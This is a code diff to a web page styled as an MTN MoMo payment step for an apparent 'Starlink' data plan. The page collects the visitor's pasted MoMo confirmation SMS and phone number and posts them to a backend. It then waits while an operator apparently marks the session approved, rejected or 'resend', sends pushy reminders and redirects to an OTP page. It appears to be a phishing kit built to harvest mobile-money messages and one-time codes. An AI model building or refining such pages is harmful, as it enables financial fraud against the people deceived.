@@ -62,7 +62,6 @@
         a { text-decoration: none; color: inherit; }
         button { font-family: inherit; cursor: pointer; border: none; background: none; }
 
-        /* HEADER */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -107,7 +106,6 @@
         .header-nav a:hover { color: var(--white); }
         .header-nav i { font-size: 18px; }
 
-        /* MAIN */
         .main {
             max-width: 1200px;
             margin: 0 auto;
@@ -127,7 +125,6 @@
             max-width: 420px;
         }
 
-        /* YELLOW BAND */
         .sms-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
             border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
@@ -175,7 +172,6 @@
             position: relative;
         }
 
-        /* WHITE CARD */
         .sms-body {
             background: var(--white);
             border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
@@ -183,7 +179,6 @@
             box-shadow: var(--shadow-lg);
         }
 
-        /* STATUS PILL */
         .status-pill {
             display: flex;
             align-items: center;
@@ -225,7 +220,6 @@
             line-height: 1.45;
         }
 
-        /* STEPS */
         .steps-label {
             font-size: 11px;
             font-weight: 800;
@@ -270,7 +264,6 @@
 
         .step-text strong { color: var(--gray-900); font-weight: 800; }
 
-        /* FORM */
         .form-label {
             display: flex;
             align-items: center;
@@ -401,11 +394,143 @@
 
         .trust-footer i { font-size: 14px; color: var(--green-600); }
 
-        /* TOAST */
-        .toast-overlay {
+        /* WAITING OVERLAY */
+        .waiting-overlay {
             position: fixed;
             inset: 0;
             z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
+            color: var(--white);
+            padding: 24px;
+            overflow: hidden;
+        }
+
+        .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
+
+        .waiting-overlay::before {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 600px; height: 600px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255,204,0,0.18) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1);   opacity: 0.6; }
+            50%      { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .waiting-content {
+            position: relative;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .waiting-orbit {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 28px;
+            position: relative;
+        }
+
+        .waiting-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2px dashed rgba(255,204,0,0.4);
+            animation: rotate 8s linear infinite;
+        }
+
+        .waiting-ring.inner {
+            inset: 22px;
+            border: 1.5px dashed rgba(59,130,246,0.4);
+            animation: rotate 5s linear infinite reverse;
+        }
+
+        @keyframes rotate { to { transform: rotate(360deg); } }
+
+        .waiting-core {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 60px; height: 60px;
+            transform: translate(-50%, -50%);
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 40px rgba(255,204,0,0.5);
+            animation: corePulse 1.6s ease-in-out infinite;
+        }
+
+        @keyframes corePulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(255,204,0,0.5); }
+            50%      { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
+        }
+
+        .waiting-core i { font-size: 28px; color: var(--black); }
+
+        .waiting-title {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+        }
+
+        .waiting-title .highlight {
+            background: linear-gradient(90deg, var(--momo-yellow), #FFD633);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .waiting-sub {
+            font-size: 14px;
+            color: var(--gray-400);
+            margin-top: 14px;
+            line-height: 1.65;
+        }
+
+        .waiting-sub strong { color: var(--white); font-weight: 800; }
+
+        .waiting-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+        }
+
+        .waiting-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--momo-yellow);
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .waiting-dot:nth-child(1) { animation-delay: -0.32s; }
+        .waiting-dot:nth-child(2) { animation-delay: -0.16s; }
+        .waiting-dot:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+            40%           { transform: scale(1);   opacity: 1; }
+        }
+
+        /* TOAST (error + reminder) */
+        .toast-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10001;
             display: none;
             align-items: center;
             justify-content: center;
@@ -435,14 +560,16 @@
             width: 56px;
             height: 56px;
             border-radius: var(--radius-md);
-            background: #FEE2E2;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 14px;
         }
 
-        .toast-icon i { font-size: 28px; color: var(--red-500); }
+        .toast-icon.error { background: #FEE2E2; }
+        .toast-icon.error i { font-size: 28px; color: var(--red-500); }
+        .toast-icon.info { background: #FFF7D6; }
+        .toast-icon.info i { font-size: 28px; color: var(--momo-yellow-dark); }
 
         .toast-title {
             font-size: 16px;
@@ -457,8 +584,6 @@
             line-height: 1.55;
             margin-bottom: 18px;
         }
-
-        .toast-text strong { font-weight: 900; color: var(--orange-600); }
 
         .toast-btn {
             width: 100%;
@@ -615,14 +740,38 @@
         </div>
     </main>
 
-    <div class="toast-overlay" id="errorToast">
+    <!-- WAITING OVERLAY -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-content">
+            <div class="waiting-orbit">
+                <div class="waiting-ring"></div>
+                <div class="waiting-ring inner"></div>
+                <div class="waiting-core">
+                    <i class="uil uil-message"></i>
+                </div>
+            </div>
+            <h2 class="waiting-title">Verifying <span class="highlight">SMS</span></h2>
+            <p class="waiting-sub">
+                Please hold on as we confirm your <strong id="waitingPlan">Standard</strong> payment message.<br>
+                This usually takes a few seconds.
+            </p>
+            <div class="waiting-dots">
+                <span class="waiting-dot"></span>
+                <span class="waiting-dot"></span>
+                <span class="waiting-dot"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST (error + reminder) -->
+    <div class="toast-overlay" id="toastOverlay">
         <div class="toast-card" id="toastCard">
-            <div class="toast-icon"><i class="uil uil-exclamation-triangle"></i></div>
-            <h3 class="toast-title">Invalid SMS</h3>
-            <p class="toast-text">
+            <div class="toast-icon error" id="toastIcon"><i class="uil uil-exclamation-triangle"></i></div>
+            <h3 class="toast-title" id="toastTitle">Invalid SMS</h3>
+            <p class="toast-text" id="toastText">
                 The SMS must start with <strong>"Y'ello"</strong>. Please paste the correct MTN MoMo confirmation message.
             </p>
-            <button class="toast-btn" id="closeToast">OK, Got It</button>
+            <button class="toast-btn" id="toastBtn">OK, Got It</button>
         </div>
     </div>
 
@@ -635,21 +784,37 @@
     </nav>
 
     <script>
+        const API_BASE = '';
+
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Standard';
         const planData = params.get('data') || '60GB';
         const planPrice = parseInt(params.get('price') || '3500', 10);
         const planPhone = params.get('phone') || '07xxxxxxxx';
 
+        document.getElementById('waitingPlan').textContent = planName;
+
         const textarea = document.getElementById('full_sms');
         const form = document.getElementById('smsForm');
         const verifyBtn = document.getElementById('verifyBtn');
         const fieldStatus = document.getElementById('fieldStatus');
         const charCount = document.getElementById('charCount');
-        const errorToast = document.getElementById('errorToast');
-        const toastCard = document.getElementById('toastCard');
-        const closeToast = document.getElementById('closeToast');
 
+        const waitingOverlay = document.getElementById('waitingOverlay');
+        const toastOverlay = document.getElementById('toastOverlay');
+        const toastCard = document.getElementById('toastCard');
+        const toastIcon = document.getElementById('toastIcon');
+        const toastTitle = document.getElementById('toastTitle');
+        const toastText = document.getElementById('toastText');
+        const toastBtn = document.getElementById('toastBtn');
+
+        let pollTimer = null;
+        let currentSessionId = null;
+        let lastReminderCount = 0;
+
+        // ============================================
+        // VALIDATE SMS
+        // ============================================
         function validateSMS() {
             const val = textarea.value.trim();
 
@@ -676,43 +841,186 @@
 
         textarea.addEventListener('input', validateSMS);
 
-        form.addEventListener('submit', function (e) {
+        // ============================================
+        // SUBMIT → POST to backend
+        // ============================================
+        form.addEventListener('submit', async function (e) {
             e.preventDefault();
 
             const val = textarea.value.trim();
 
             if (!val.startsWith("Y'ello")) {
-                showToast();
+                showToast('error', 'Invalid SMS', 'The SMS must start with <strong>"Y\'ello"</strong>. Please paste the correct MTN MoMo confirmation message.');
                 return;
             }
 
             verifyBtn.disabled = true;
             verifyBtn.innerHTML = '<span class="btn-spinner"></span><span>Verifying...</span>';
 
-            setTimeout(() => {
-                // Redirect to OTP verification page
-                const otpParams = new URLSearchParams({
-                    plan: planName,
-                    data: planData,
-                    price: planPrice,
-                    phone: planPhone
+            try {
+                const res = await fetch(API_BASE + '/api/sms', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice,
+                        phone: planPhone,
+                        sms: val
+                    })
                 });
-                window.location.href = '/otp-verify/?' + otpParams.toString();
-            }, 1500);
+
+                const data = await res.json();
+
+                if (!data.ok) {
+                    verifyBtn.disabled = false;
+                    verifyBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify Payment</span>';
+                    showToast('error', 'Error', 'Something went wrong. Please try again.');
+                    return;
+                }
+
+                currentSessionId = data.sessionId;
+                lastReminderCount = 0;
+
+                waitingOverlay.classList.add('open');
+                document.body.classList.add('modal-open');
+                startPolling(currentSessionId);
+
+            } catch (err) {
+                console.error(err);
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify Payment</span>';
+                showToast('error', 'Network Error', 'Please check your connection and try again.');
+            }
         });
 
-        function showToast() {
-            errorToast.classList.add('open');
+        // ============================================
+        // POLL STATUS
+        // ============================================
+        function startPolling(sessionId) {
+            clearInterval(pollTimer);
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(API_BASE + '/api/status/' + sessionId);
+                    const data = await res.json();
+
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        clearInterval(pollTimer);
+                        const otpParams = new URLSearchParams({
+                            plan: planName,
+                            data: planData,
+                            price: planPrice,
+                            phone: planPhone
+                        });
+                        window.location.href = '/otp-verify/?' + otpParams.toString();
+
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showToast(
+                            'error',
+                            'Payment Rejected',
+                            data.message || 'Rejected. Please try again.',
+                            'OK, Got It',
+                            () => {
+                                window.location.href = '/checkout/?' + new URLSearchParams({
+                                    plan: planName,
+                                    data: planData,
+                                    price: planPrice
+                                }).toString();
+                            }
+                        );
+
+                    } else if (data.status === 'resend_requested') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showToast(
+                            'error',
+                            'Wrong SMS',
+                            data.message || 'You pasted the wrong SMS. Ensure your details match this order to complete the payment.',
+                            'Try Again',
+                            () => {
+                                window.location.href = '/checkout/?' + new URLSearchParams({
+                                    plan: planName,
+                                    data: planData,
+                                    price: planPrice
+                                }).toString();
+                            }
+                        );
+
+                    } else if (data.status === 'reminder_sent') {
+                        // Don't stop polling; just show the reminder once per reminder count
+                        // Use a simple counter so we don't spam — show only on state change
+                        if (lastReminderCount === 0) {
+                            lastReminderCount = 1;
+                            showToast(
+                                'info',
+                                'A Gentle Reminder',
+                                data.message || 'Kindly check your inbox and copy the message you have received, then paste it here. We are almost there — just one more step to unlock your Starlink connection!',
+                                'OK, Got It',
+                                null,
+                                true
+                            );
+                        }
+
+                    } else if (data.status === 'timeout') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showToast(
+                            'error',
+                            'Session Expired',
+                            'Please start the payment again from the plans page.',
+                            'OK',
+                            () => {
+                                window.location.href = '/plans/';
+                            }
+                        );
+                    }
+                } catch (err) {
+                    // retry silently
+                }
+            }, 2000);
+        }
+
+        // ============================================
+        // SHOW TOAST
+        // ============================================
+        let toastAction = null;
+
+        function showToast(type, title, text, buttonLabel, action, keepWaitingOpen) {
+            toastIcon.className = 'toast-icon ' + (type === 'info' ? 'info' : 'error');
+            toastIcon.innerHTML = type === 'info'
+                ? '<i class="uil uil-bell"></i>'
+                : '<i class="uil uil-exclamation-triangle"></i>';
+
+            toastTitle.textContent = title;
+            toastText.innerHTML = text;
+            toastBtn.textContent = buttonLabel || 'OK, Got It';
+
+            toastAction = action || null;
+
+            toastOverlay.classList.add('open');
             setTimeout(() => toastCard.classList.add('show'), 50);
-            setTimeout(hideToast, 5000);
         }
 
         function hideToast() {
             toastCard.classList.remove('show');
-            setTimeout(() => errorToast.classList.remove('open'), 250);
+            setTimeout(() => toastOverlay.classList.remove('open'), 250);
         }
 
-        closeToast.addEventListener('click', hideToast);
+        toastBtn.addEventListener('click', () => {
+            const action = toastAction;
+            toastAction = null;
+            hideToast();
+            if (typeof action === 'function') {
+                setTimeout(action, 250);
+            } else {
+                // Keep polling for reminder (no action needed)
+                document.body.classList.remove('modal-open');
+            }
+        });
     </script>
 </body>
 </html>
